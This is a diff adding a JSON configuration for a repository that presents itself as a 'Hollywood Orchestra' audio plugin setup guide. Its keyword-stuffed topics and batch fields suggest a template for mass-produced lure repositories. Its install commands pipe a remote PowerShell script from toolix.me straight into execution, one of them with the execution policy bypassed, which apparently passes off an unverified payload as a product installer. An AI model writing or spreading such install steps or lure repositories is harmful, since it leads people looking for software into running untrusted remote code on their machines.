@@ -1,0 +1,27 @@
+{
+  "repo": "Hollywood-Orchestra-Setup",
+  "product": "Hollywood Orchestra Setup",
+  "product_title": "Hollywood Orchestra",
+  "kind": "audio",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "audio",
+  "topics": [
+    "how-to-install-hollywood-orchestra",
+    "hollywood-orchestra-app",
+    "daw-plugin",
+    "mixing-tools",
+    "audio-editing",
+    "music-production",
+    "hollywood-orchestra-audio-tool",
+    "hollywood-orchestra-music-production",
+    "hollywood-orchestra",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
